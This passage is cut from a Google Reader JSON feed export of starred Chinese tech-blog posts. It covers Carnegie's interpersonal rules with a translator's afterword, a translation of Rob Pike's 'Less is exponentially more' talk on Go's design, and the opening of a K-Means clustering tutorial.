诚恳地站在他人的角度，看待问题。<br>\n　　Try honestly to see things from the other person's point of view.</p>\n\n<p>18. 对他人的想法和主张，抱有理解和同情。<br>\n　　Be sympathetic with the other person's ideas and desires.</p>\n\n<p>19. 诉诸更高尚的动机。<br>\n　　Appeal to the nobler motives.</p>\n\n<p>20. 把你的想法，用故事表达。<br>\n　　Dramatize your ideas.</p>\n\n<p>21. 激起对方的好胜心。<br>\n　　Throw down a challenge.</p>\n\n<p><strong>四、如何做领导者</strong></p>\n\n<p>----不冒犯、也不引发怨恨地，让他人按照你的主张行事。</p>\n\n<p>22. 以表扬和真诚的欣赏开场。<br>\n　　Begin with praise and honest appreciation.</p>\n\n<p>23. 婉转地指出他人的错误。<br>\n　　Call attention to people's mistakes indirectly.</p>\n\n<p>24. 批评他人之前，先谈自己的错误。<br>\n　　Talk about your own mistakes before criticizing the other person.</p>\n\n<p>25. 设问，而不是下达命令。<br>\n　　Ask questions instead of giving direct orders.</p>\n\n<p>26. 让他人有面子。<br>\n　　Let the other person save face.</p>\n\n<p>27. 赞扬每一个细微的进步，衷心地表达你的认可，慷慨地给出赞美之词。<br>\n　　Praise the slightest improvement and praise every improvement. Be \"hearty in your approbation and lavish in your praise.\"</p>\n\n<p>28. 给他人应有的荣誉。<br>\n　　Give the other person a fine reputation to live up to.</p>\n\n<p>29. 不断地鼓励，让犯错看上去是一件小事。<br>\n　　Use encouragement. Make the fault seem easy to correct.</p>\n\n<p>30. 他人做你建议的事情时，让他们心情愉快。<br>\n　　Make the other person happy about doing the thing you suggest.</p>\n\n<p>================================================</p>\n\n<p><strong>译后记</strong></p>\n\n<p>翻译完这些内容，我一方面感到，它们的的确确是处理人际关系的有效法则，你照着去做，肯定能得到满意的结果；另一方面也感叹，人性并无奥妙，不过如此，以至于我们可以用编程般的法则去处理。</p>\n\n<p>我还有一个强烈的感觉，就是不能极端遵守这些法则。如果你一五一十遵守它们，绝不违背，你会变成什么？</p>\n\n<p>......成功者？最受欢迎的人？领袖？</p>\n\n<p>我感觉，很可能变成一个政客。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/06/how_to_win_friends_and_influence_people.html\">http://www.ruanyifeng.com/blog/2012/06/how_to_win_friends_and_influence_people.html</a></li>\n<li>最后修改时间：2012年8月 9日 23:29</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1341471304102",
    "timestampUsec" : "1341471304102183",
    "id" : "tag:google.com,2005:reader/item/45f4d08042ee2816",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "编程语言", "C++", "Go", "Unix" ],
    "title" : "少即是极多",
    "published" : 1341447145,
    "updated" : 1341447145,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7771.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>【<span style=\"color:#cc0000\"><strong>感谢网友 <a href=\"https://twitter.com/#!/innocentim\">@innocentim</a></strong> (Twitter)<strong> 投稿</strong></span>】</p>\n<p>这是一篇翻译练习。力图保留原意。若有不准确处，求速速指出。<a href=\"http://commandcenter.blogspot.com/2012/06/less-is-exponentially-more.html\">猛击此处</a>（墙）看原文。作者为Rob Pike，贝尔实验室来的大牛，现在就职于Google。他主导了Go语言的创建工作。下面是正文——</p>\n<p style=\"text-align:center;font-size:9pt\"><span style=\"color:#999999\">——————————————正文分隔线——————————————</span></p>\n<p><img title=\"Less is More\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/Less-is-More-Box-ShopTab-300x282.jpg\" alt=\"\" width=\"300\" height=\"282\">这是我在2012年6月的Go SF上演讲的文本。</p>\n<p>这是一个个人演讲。 我承认，虽然面前的团队让Go诞生并延续，但是我的观点并不代表任何其他Go语言小组成员的意见。 我也想感谢Go SF的组织者提供这个和你们交流的机会。</p>\n<p>几星期前我被问起:“你在推出Go的过程中遇到的最大的惊奇是什么？”我立即意识到了答案: 虽然我们希望C++程序员意识到Go是个较好的选择，但是令人意外的是，大多数Go程序员来自Python和Ruby这样的动态语言，而很少有来自C++的。</p>\n<p>我们——Ken，Robert和我——是C++程序员(译者: Ken也用C++？)，当时在为解决我们所写的这类软件产生的问题设计一个新的语言。 这似乎有点自相矛盾，因为别的C++程序员根本不关心这些问题，更不会去设计一个语言。</p>\n<p>我今天想说的是关于那些激发我们创造Go的事情，和为什么它本不应令我们如此惊讶。 我保证这些内容更多与Go相关而不是C++，所以即使你不很了解C++你也能跟得上。</p>\n<p>回答可以这样归结: 你认为”少即是多”呢，还是”少就是少”？</p>\n<p>这里有个比喻，将以真实故事的形式给出。 贝尔实验室中心原来发放3位数号码: 物理研究是111，计算科学研究是127，如此这般。 1980年代早期，一个便笺飞过来说”鉴于你们对研究的理解有所加深，将为你们的号码多加上一位，以便更好地体现你们的工作”。 所以我们中心的号码变成了1127。 Ron Hardin半当真地开玩笑说如果我们真的理解我们的世界更好一点的话，我们将丢掉一位数字，将127变成27。 当然主管没听到这个笑话(这也不是我们希望的)，但是我想这里面有点值得思考的东西。 少即是多。 你理解得越好，你将变得越简洁。</p>\n<p><span></span></p>\n<p>先记住这句话。</p>\n<p>回到2007年9月，我在做一个庞大的Google C++项目的细微但核心的部分。 开发必须交互进行，但是我这部分在我们的Google编译集群上要编译45分钟。 同时，有个消息传过来说一群在C++社区的Google员工将开一场讲座，介绍即将到来的C++0x(现在称为C++11)。</p>\n<p>在那场持续一小时的讲座中，我们听说了诸如计划中的35个新特性的说法——事实上还有更多，但是那场讲座只说有35个。 有些特性当然是细微的，但是讲座中谈到的至少是足够重要的。 提到的特性中，有些十分微妙并难以理解，比如右值引用(rvalue references); 有些特别符合C++范儿，比如可变参数模板(variadic templates); 还有些十分疯狂，比如用户定义的字面量(user-defined literals)。</p>\n<p>那时候我问了自己一个问题: C++社区真的觉得C++错在没有足够多的特性么？ 显然，从Ron Hardin的笑话的角度看，简化语言将比添加新特性取得更好的效果。 当然，对C++来说这很不靠谱，但是先记住这点。</p>\n<p>在这场讲座的几个月之前我做了一场讲座(你可以通过<a href=\"http://video.google.com/videoplay%EF%BC%9Fdocid=810232012617965344\">YouTube</a>看到)，讲的是一个我1980年代做的一个玩具并发编程语言。 这个语言叫<a href=\"ftp://cs.bell-labs.com/cm/cs/who/rsc/thread/newsqueak.pdf\">Newsqueak</a>，而且显然地，它成为了Go的前身。</p>\n<p>在我在Google工作的过程中，我发现我丢掉了Newsqueak中的一些点子。 现在我将重新思考它们，所以我才做了那场讲座。 我相信它们会让服务器端编程变得更容易，而且Google能真正从中获益。</p>\n<p>我真的尝试将这些点子加入到C++中，可惜失败了。 我实在难以将一组并发操作融入到C++的控制流程中去——当真融进去的话，它们将变得十分丑陋，从而难以看到优越性。 另外，C++将它变得十分臃肿(虽然我从来没真正发现C++苗条过)。 所以我放弃了这个想法。</p>\n<p>但是C++0x的讲座使我再次思考。 一件事十分困扰我——我相信也困扰着Ken和Robert——C++的新内存模型居然新增了原子类型。 为这个不堪重负的类型系统加上这么个细致精巧到极致类型机制十分的不靠谱，不是么？ 将语言和今日的硬件绑在一起似乎有点目光短浅并且不明智，因为硬件过几年就有大变。</p>\n<p>那场C++0x讲座结束之后，我们回到办公室。 我开始了另一个编译(译者笑)，转过转过我的椅子，面对Robert，然后开始问一些尖锐的问题。 在编译完成之前，我们拉拢了Ken，并决定做些什么。 我们再也不想写C++了，并且我们——尤其是我——在写Google代码时，想让并发拿来就用。 同时我们也想解决”大系统编程”的问题，容后细说。</p>\n<p>我们在白板上写下一组我们需要的东西——迫切需要的那种。 我们规划出大体的轮廓，忽略了语法细节和语义。</p>\n<p>我仍然有一条碉堡了的那周的邮件线索。 这是一些摘录:</p>\n<blockquote><p><strong>Robert</strong>: 起点: C，修补一些显而易见的瑕疵，去除繁杂的东西。 新增一些特性。</p>\n<p><strong>Rob</strong>: 命名为’go’。 你可以为这个名字编造各种理由，但是它确实拥有很多好的特性。 它短小，易于打出。 工具么: goc，gol，goa。 如果有个交互式调试器/解释器，可以直接叫’go’。 代码后缀是。go。</p>\n<p><strong>Robert</strong>: 空接口: interface {}。 将被所有接口实现(译者: 原文如此)，并且可以取代void*。</p></blockquote>\n<p>我们并没有立即全部设计出来。 比如我们花了一年多才设计出了数组(array)和切片(slice)。 不过相当一部分重要的设计在最初的几天中浮现。</p>\n<p>注意到Robert说C是起点，并非C++。 对于这点我不是很确定，不过我相信他说的是C，因为Ken在场(译者笑)。 但是最后我们并没有从C开始，这倒是真的。 我们从最初的草稿开始，仅仅从其它语言中借鉴琐碎的东西，比如运算符，各种括号和一些常见的关键字。(当然我们也借鉴了我们所知道的语言中的思想。)不管怎么说，我们破而后立，从头做起，以此来响应C++。 我们并非想做一个更好的C++，甚至不是一个更好的C。 它仅仅是一个对我们所关心的软件来说更好的语言。</p>\n<p>最后，我们得到了既不同于C也不同于C++的东西，甚至比许多人意识到的还要不同。 我列了一个对于C和C++的Go的重要的简化的列表:</p>\n<ul>\n<li>常规的语法(不需要一个符号表来辅助解析)</li>\n<li>GC机制(仅仅是GC)</li>\n<li>没有头文件</li>\n<li>显式依赖关系</li>\n<li>没有循环依赖</li>\n<li>数字常量仅仅是数字(译者: 没有类型)</li>\n<li>int和int32不是同种类型</li>\n<li>字母大小写将确定可见性</li>\n<li>任何类型都可以有方法(没有类)</li>\n<li>没有子类型继承(没有子类)</li>\n<li>包级别的初始化和良好定义的初始化顺序</li>\n<li>同一个包的文件一起编译</li>\n<li>包级别的全局定义可以以任意顺序进行</li>\n<li>没有算术类型转换(常量可以弥补)</li>\n<li>接口是隐式实现的(没有”implements”声明)</li>\n<li>嵌入的结构体(没有类型提升和子类)</li>\n<li>方法像函数一样定义(不必定义在特殊的地方)</li>\n<li>方法就是函数</li>\n<li>接口就是方法(没有数据)</li>\n<li>方法仅仅靠名字匹配(不是靠类型)</li>\n<li>没有构造函数和析构函数</li>\n<li>后置增量/减量运算符仅仅是语句，而不是表达式</li>\n<li>没有前置增量/减量运算符</li>\n<li>赋值号是语句，不是表达式</li>\n<li>表达式求值顺序在赋值和函数调用时确定(没有所谓的”sequence point”)</li>\n<li>没有指针算术</li>\n<li>内存总是初始化为0</li>\n<li>对本地变量取地址是合法的</li>\n<li>方法中没有叫this的指针</li>\n<li>分段式栈</li>\n<li>没有常量或其它类型的注记</li>\n<li>没有模板</li>\n<li>没有异常</li>\n<li>内建字符串，切片和映射(map)</li>\n<li>数组边界检查</li>\n</ul>\n<p>并且，我相信通过这一系列的简化，Go将比C或C++更具有表现力。 少即是多。</p>\n<p>但是我们没法一下子把所有部分都做出来。 我们需要构建最基础的部分，比如说类型系统的表示，能良好应用于实际的语法，和一些无法形容的但能让库更容易相互操作的东西。</p>\n<p>我们同样增加了C或C++中没有的东西，比如切片和映射，组合字面量(？)，文件顶层的表达式(这虽是件大事，但是几乎不为人知)，反射机制，GC等等。 自然，还有并发。</p>\n<p>一个显眼的缺少的东西是类型的继承。 请允许我粗暴地对待它一分钟。</p>\n<p>早先构建Go的时候有人跟我说，他无法想象用一门没有泛型的语言工作。 正如我在别处说明的那样，我觉得这是个很诡异的言论。</p>\n<p>公平起见，他用自己的话说可能是他真的很喜欢C++中STL的那些容器。 以辩论为目的的话，我们来正面看看他的言论。</p>\n<p>他说的意味着: 他发现写一个容器，比如以int为元素类型的链表，或字符串映射是一种不能忍的重负。 我发现这是个很诡异的言论，因为我几乎没把时间花在那些个问题上，即使我在用没有泛型的语言。</p>\n<p>但是，更重要的是，他说的那些表示<em>类型系统</em>将会解除这种负担。 <em>类型系统</em>。 不是多态函数，或语言级原语，或其它类型的辅助手段(helpers)，而仅仅是<em>类型系统</em>。</p>\n<p>这就是粘住我的那个细节。</p>\n<p>从C++或Java来Go的程序员怀念和类型系统在一起的日子，特别是带继承和子类的那部分。 也许我在类型系统方面是粗暴了些，但是我绝不觉得那套玩意非常具有表现力。</p>\n<p>我已故的朋友Alain Fournier一次告诉我说他认为学术工作的最底层是分类学。 然后信不信由你，类型继承正是分类学。 你必须决定哪个萝卜扔哪个坑里，每个类型的父类型，A是否继承B或者B是否继承A。 一个可排序的数组是一个带有sort方法的数组呢，还是一个长得像数组的排序器呢？ 如果你觉得类型系统能解决所有设计上的问题，你必须做出这个无意义的选择。</p>\n<p>我相信对编程来说那是个荒诞的思路。 真正的重点不在于事物之间的继承关系，而在于它们能提供些什么。</p>\n<p>因此，接口这个概念进入了Go。 但是它们都是主要部分——真正的Go之道——的一部分。</p>\n<p>如果C++和Java注重类型继承和类型系统的分类学，那末Go就注重组合。</p>\n<p>Doug Mcilroy，Unix管道的最终发明人，在1964年(!)写道:</p>\n<blockquote><p>我们应该有一些机制能将程序耦合(串)起来，像花园软管那样——当我们需要另一种方式传送数据时，拧紧另外一段即可。 I/O也可以这么做。</p></blockquote>\n<p>这也是Go所提倡的道路。 Go吸收这个观点，然后把它推进得十分远。 这是一门关于(功能上的)组合和(调用上的)耦合的语言。</p>\n<p>一个显然的例子是接口是组合各部分的途径。 关键是，那些部分是什么并不重要，如果某类型实现了M方法我就可以把这个方法填到接口里去。</p>\n<p>另一个重要的例子是如何让并发性提供给我们不同的独立计算部分的组合。</p>\n<p>并且还有一种不同寻常(但十分简单)的类型组合形式: 嵌入。</p>\n<p>————————————————————————</p>\n<p>我想提一个和之前不太相关的Go设计: Go被设计为大型团队用来写大型程序的语言。</p>\n<p>这里有个概念是”大型编程”，并且不知何故C++和Java主宰了这个领域。 我相信这只是因为其历史巧合，或者是工业上的巧合。 但是被广泛接纳的观点是他们和面向对象设计有关。</p>\n<p>我压根不相信这点。 大型软件需要确定的方法，但是更重要的是它需要强依赖性管理，干净的接口抽象和优越的文档工具。 C++没一点做得好的(虽然Java明显要好很多)。</p>\n<p>我们还不知道Go语言能做到何种程度，因为现在还没有足够的软件是用Go写的。 但是我非常有信心于Go将会成为一个优越的大型编程语言。 时间会说明一切的。</p>\n<p>————————————————————————</p>\n<p>现在，回到我们演讲开始提的那个问题:</p>\n<p>为什么Go，作为从头被设计为符合C++使用者习惯的语言，没有吸引很多C++程序员？</p>\n<p>严肃点说，我觉得是因为Go和C++在哲学方面有着巨大的不同。</p>\n<p>C++是将所有东西提到你指尖上(译者: 即多范式)。 我在C++11的FAQ上找到了这段引用:</p>\n<blockquote><p>C++能优雅地，灵活地，零损耗地(相比于手工操纵代码)表达抽象的能力大幅提升了。</p></blockquote>\n<p>Go并非这种”围绕式”的。 你并不需要所有的东西都内建好。 你不需要对每个执行细节进行精细的控制。 比如，你不需要RAII，但你拥有一个垃圾回收器，也意味着你不需要执行释放内存的操作。</p>\n<p>你得到的是一组非常强有力但易于理解，易于用来构建积木的功能，这些积木可以用来组合出一个你需要的问题的解法。 这并不意味着它能像别的一些语言创造的解法一样快速，复杂，或带来思想上的激励，但是它总能保证易于书写，易于阅读，易于理解，易于维护，而且可能更安全。</p>\n<p>从另一个角度说，这当然算作过度简化:</p>\n<p>Python和Ruby程序员转到Go，因为他们不需要牺牲表达能力，却获得了性能的提升，并且能好好玩并发系统了。</p>\n<p>C++程序员<em>并没有</em>转到Go是因为他们好不容易获得了对程序的精细控制，并且不想牺牲它们的任何一部分。 对他们而言，写软件不仅包括把事情做完，而且包括用特定的方式完成。</p>\n<p>关键是，在将来，Go的成功将会颠覆他们的世界观。</p>\n<p>并且从一开始我们就应该意识到这点。 对于C++11的新特性很兴奋的人们并不关心一个拥有如此少特性的语言。 即使最后他提供了如此多。</p>\n<p>谢谢。</p>\n<p>（全文完）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"Go语言源码的一个改动\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1761.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7771.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/05/11/8399164.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Go语言源码的一个改动</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Unix Pipes 管道原稿\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1351.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7771.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10437748.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Unix Pipes 管道原稿</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Unix 40年：昨天，今天和明天 \" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1023.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7771.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10437733.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Unix 40年：昨天，今天和明天 </font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"到处都是Unix的胎记\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1532.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7771.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">到处都是Unix的胎记</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Linux/Unix 新手和专家教程\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1042.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7771.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10437737.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Linux/Unix 新手和专家教程</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\" title=\"对技术的态度\">对技术的态度</a></li><li>2012年08月01日 -- <a href=\"http://coolshell.cn/articles/7965.html\" title=\"一个fork的面试题\">一个fork的面试题</a></li><li>2011年07月18日 -- <a href=\"http://coolshell.cn/articles/4990.html\" title=\"程序员技术练级攻略\">程序员技术练级攻略</a></li><li>2011年03月29日 -- <a href=\"http://coolshell.cn/articles/4102.html\" title=\"如何学好C语言\">如何学好C语言</a></li><li>2009年11月12日 -- <a href=\"http://coolshell.cn/articles/1761.html\" title=\"Go语言源码的一个改动\">Go语言源码的一个改动</a></li><li>2009年10月11日 -- <a href=\"http://coolshell.cn/articles/1532.html\" title=\"到处都是Unix的胎记\">到处都是Unix的胎记</a></li><li>2012年09月07日 -- <a href=\"http://coolshell.cn/articles/8239.html\" title=\"无锁队列的实现\">无锁队列的实现</a></li></ul></p>"
    },
    "author" : "Tim Shen",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1340990569810",
    "timestampUsec" : "1340990569810754",
    "id" : "tag:google.com,2005:reader/item/7a8160fc2e9ae536",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "程序设计", "Algorithm", "Data Mining", "K-Means" ],
    "title" : "K-Means 算法",
    "published" : 1340929442,
    "updated" : 1340929442,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7779.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>最近在学习一些数据挖掘的算法，看到了这个算法，也许这个算法对你来说很简单，但对我来说，我是一个初学者，我在网上翻看了很多资料，发现中文社区没有把这个问题讲得很全面很清楚的文章，所以，把我的学习笔记记录下来，分享给大家。</p>\n<p>在数据挖掘中， <strong><em>k</em>-Means 算法</strong>是一种 <a title=\"Cluster analysis\" href=\"http://en.wikipedia.org/wiki/Cluster_analysis\">cluster analysis</a> 的算法，其主要是来计算数据聚集的算法，主要通过不断地取离种子点最近均值的算法。</p>\n<h4>问题</h4>\n<p>K-Means算法主要解决的问题如下图所示。我们可以看到，在图的左边有一些点，我们用肉眼可以看出来有四个点群，但是我们怎么通过计算机程序找出这几个点群来呢？于是就出现了我们的K-Means算法（<a title=\"K-means Clustering 算法\" href=\"http://en.wikipedia.org/wiki/K-means_clustering\">Wikipedia链接</a>）</p>\n<div style=\"width:610px\"><img title=\"K-Means 要解决的问题\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/K-Means.gif\" alt=\"\" width=\"600\" height=\"300\"><p>K-Means 要解决的问题</p></div>\n<h4>算法概要</h4>\n<p>这个算法其实很简单，如下图所示：</p>\n<p><span></span></p>\n<div style=\"width:514px\"><img title=\"K-Means 算法概要\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/K-Means.jpg\" alt=\"K-Means 算法概要\" width=\"504\" height=\"370\"><p>K-Means 算法概要</p></div>\n<p>从上图中，我们可以看到，<strong>A, B, C, D, E 是五个在图中点。而灰色的点是我们的种子点，也就是我们用来找点群的点</strong>。有两个种子点，所以K=2。</p>\n<p>然后，K-Means的算法如下：</p>\n<ol>\n<li>随机在图中取K（这里K=2）个种子点。</li>\n<li>然后对图中的所有点求到这K个种子点的距离，假如点Pi离种子点Si最近，那么Pi属于Si点群。（上图中，我们可以看到A,B属于上面的种子点，C,D,E属于下面中部的种子点）</li>\n<li>接下来，我们要移动种子点到属于他的“点群”的中心。（见图上的第三步）</li>\n<li>然后重复第2）和第3）步，直到，种子点没有移动（我们可以看到图中的第四步上面的种子点聚合了A,B,C，下面的种子点聚合了D，E）。</li>\n</ol>\n<p>这个算法很简单，但是有些细节我要提一下，求距离的公式我不说了，大家有初中毕业水平的人都应该知道怎么算的。我重点想说一下“求点群中心的算法”</p>\n<h4>求点群中心的算法</h4>\n<p>一般来说，求点群中心点的算法你可以很简的使用各个点的X/Y坐标的平均值。不过，我这里想告诉大家另三个求中心点的的公式：</p>\n<p><strong>1）Minkowski Distance 公式 ——</strong> λ 可以随意取值，可以是负数，也可以是正数，或是无穷大。</p>\n<p><img title=\"Minkowski Distance 公式\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/MinkowskiDistance_clip_image102.gif\" alt=\"\" width=\"131\" height=\"51\"></p>\n<p><strong>2）Euclidean Distance 公式 </strong>—— 也就是第一个公式 λ=2 的情况</p>\n<p><img title=\"Euclidean Distance 公式\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/EuclideanDistance_clip_image002.gif\" alt=\"\" width=\"137\" height=\"51\"></p>\n<p><strong>3）CityBlock Distance 公式 </strong>—— 也就是第一个公式 λ=1 的情况</p>\n<p><img title=\"CityBlock Distance 公式\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/CityBlockDistance_clip_image002.gif\" alt=\"\" width=\"111\" height=\"45\"></p>\n<p>这三个公式的求中心点有一些不一样的地方，我们看下图（对于第一个 λ 在 0-1之间）。</p>\n<p style=\"text-align:center\"><img title=\"Minkowski Mean\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/Minkowski-Mean.jpg\" alt=\"\" width=\"180\" height=\"180\">   <img title=\"Euclidean distance\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/Euclidean-distance.jpg\" alt=\"\" width=\"180\" height=\"180\">  <img title=\"Manhattan distance\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/Manhattan-distance.jpg\" alt=\"\" width=\"180\" height=\"180\"></p>\n<p style=\"text-align:center\"><strong>（1）Minkowski Distance     （2）<strong>Euclidean Distance    （3） <strong>CityBlock Distance</strong></strong></strong></p>\n<p style=\"text-align:left\">上面这几个图的大意是他们是怎么个逼近中心的，第一个图以星形的方式，第二个图以同心圆的方式，第三个图以菱形的方式。</p>\n<h4 style=\"text-align:left\">K-Means的演示</h4>\n<p style=\"text-align:left\">如果你以”<a href=\"https://www.google.com/search?hl=zh-CN&amp;q=K+Means+Demo\">K Means Demo</a>“为关键字到Google里查你可以查到很多演示。这里推荐一个演示</p>\n<p style=\"text-align:center\"><a href=\"http://home.dei.polimi.it/matteucc/Clustering/tutorial_html/AppletKM.html\">http://home.dei.polimi.it/matteucc/Clustering/tutorial_html/AppletKM.html</a></p>\n<p style=\"text-align:left\">操作是，鼠标左键是初始化点，右键初始化“种子点”，然后勾选“Show History”可以看到一步一步的迭代。</p>\n<p style=\"text-align:left\">注：这个演示的链接也有一个不错的 <a href=\"http://home.dei.polimi.it/matteucc/Clustering/tutorial_html/index.html\">K Means Tutorial</a> 。</p>\n<h4 style=\"text-align:left\">K-Means ++ 算法</h4>\n<p>K-Means主要有两个最重大的缺陷——都和初始值有关：</p>\n<ul>\n<li> K 是事先给定的，这个 K 值的选定是非常难以估计的。很多时候，事先并不知道给定的数据集应该分成多少个类别才最合适。（ <a href=\"http://en.wikipedia.org/wiki/Multispectral_pattern_recognition\">ISODATA 算法</a>通过类的自动合并和分裂，得到较为合理的类型数目 K）</li>\n</ul>\n<ul>\n<li>K-Means算法需要用初始随机种子点来搞，这个随机种子点太重要，不同的随机种子点会有得到完全不同的结果。（<a 